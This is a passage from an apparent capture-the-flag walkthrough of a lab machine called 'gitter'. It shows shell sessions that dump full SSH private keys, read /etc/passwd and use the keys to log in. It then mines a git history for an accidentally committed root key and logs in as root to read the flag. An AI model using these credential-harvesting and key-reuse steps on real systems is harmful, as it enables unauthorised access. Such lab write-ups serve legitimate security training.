JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
roosa@gitter:~/.ssh$
```

```sh
roosa@gitter:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4wy3iqH+JvzrEkEubN4+Xr/llE0mRSP9e6/X53qdxxN99v/v2wheFraHhrh+nXwXneN3Hc+oQ7scBeWzMCUG8Z2DreL4vFaa7ynkGtOYQ+X5xDglH9H57E2CAe6qynyutwer3qVte05HLxI6WJSN+yk+xZ9jsluS0rJpArQm6dHbmNWS/liEZV7JpM2ZI09OWlkJUZUCnVGi1Z1z/R7HurOerjnAtva1kUYTTGZhN5eChpfj1AhBCeiLoM/f7sStBJ3pAZOrmYK+zOmdNSybAWPklF2GMazO3TMEaWWxWf3073Qqbek3xI3XJYJNqXoUtSK7FeD31hJXS0SXSt9JT roosa@gitter
roosa@gitter:~/.ssh$
```

```sh
roosa@gitter:~/.ssh$ cat known_hosts
|1|UAZEMnlc1N5KOdK/ZxK6Ggng9FY=|hTYSll3B4tN2lr+D6RrzShp/IAE= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEYP1w+H8Uuvfh0fzjA15tqYhqxIhiT8ODPLI4qTBvrM8pZIGErdFlMYGV3rhJAYqGJD05LsvJxC8zozRFmZuw=
roosa@gitter:~/.ssh$
```

```sh
roosa@gitter:~/.ssh$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
roosa@gitter:~/.ssh$
```

```sh
root@kali:~/devoops# cat roosa.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
root@kali:~/devoops#
root@kali:~/devoops# chmod 600 roosa.key
root@kali:~/devoops#
root@kali:~/devoops# ssh -i roosa.key roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Tue Nov 13 19:36:56 2018 from 10.10.14.18
roosa@gitter:~$
```

```sh
roosa@gitter:~$ ls -l
total 68
drwxrwxr-x 4 roosa roosa 4096 Mar 26  2018 deploy
drwxr-xr-x 2 roosa roosa 4096 May 29 10:44 Desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Documents
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Downloads
-rw-r--r-- 1 roosa roosa 8980 Mar 19  2018 examples.desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Music
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Pictures
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Public
-rwxrw-r-- 1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
-rw-rw-r-- 1 roosa roosa 1839 Mar 26  2018 service.sh
-rw-rw-r-- 1 roosa roosa 2206 Mar 26  2018 service.sh~
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Templates
-r-------- 1 roosa roosa   33 Mar 26  2018 user.txt
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Videos
drwxrwxr-x 3 roosa roosa 4096 Mar 21  2018 work
roosa@gitter:~$
roosa@gitter:~$ cd work/
roosa@gitter:~/work$ ls -l
total 4
drwxrwx--- 5 roosa roosa 4096 Mar 21  2018 blogfeed
roosa@gitter:~/work$ cd blogfeed/
roosa@gitter:~/work/blogfeed$
roosa@gitter:~/work/blogfeed$ ls -lah
total 28K
drwxrwx--- 5 roosa roosa 4.0K Mar 21  2018 .
drwxrwxr-x 3 roosa roosa 4.0K Mar 21  2018 ..
drwxrwx--- 8 roosa roosa 4.0K Mar 26  2018 .git
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4.0K Mar 19  2018 resources
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
drwxrwx--- 2 roosa roosa 4.0K Mar 26  2018 src
roosa@gitter:~/work/blogfeed$
roosa@gitter:~/work/blogfeed$ git log
commit 7ff507d029021b0915235ff91e6a74ba33009c6d
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 26 06:13:55 2018 -0400

    Use Base64 for pickle feed loading

commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:37:00 2018 -0400

    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.

commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:08:09 2018 -0400

    Debug support added to make development more agile.

commit ca3e768f2434511e75bd5137593895bd38e1b1c2
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:38:21 2018 -0400

    Blogfeed app, initial version.

commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:37:56 2018 -0400

    Gunicorn startup script

commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit
roosa@gitter:~/work/blogfeed$
```

![](images/11.png)

```sh
roosa@gitter:~/work/blogfeed$ git diff d387abf63e05c9628a59195cec9311751bdb283f
```

![](images/12.png)

```sh
root@kali:~/devoops# cat unknown.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
root@kali:~/devoops#
root@kali:~/devoops# chmod 600 unknown.key
```

```sh
root@kali:~/devoops# ssh -i unknown.key 10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# cd /root
root@gitter:~# ls -la
total 52
drwx------  9 root root 4096 Mar 26  2018 .
drwxr-xr-x 23 root root 4096 Mar 20  2018 ..
-r--------  1 root root  113 May 29 10:52 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  4 root root 4096 Mar 26  2018 .cache
drwx------  3 root root 4096 Mar 21  2018 .dbus
drwx------  2 root root 4096 Mar 21  2018 .emacs.d
drwx------  2 root root 4096 Apr  3  2018 .gconf
drwx------  3 root root 4096 Mar 21  2018 .gnupg
drwxr-xr-x  2 root root 4096 Mar 19  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Mar 26  2018 root.txt
drwx------  2 root root 4096 Mar 26  2018 .ssh
root@gitter:~# cat root.txt
d4fe1e7f7187407eebdd3209cb1ac7b3
root@gitter:~#
```

###### Reference

- [evilpacket/DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage)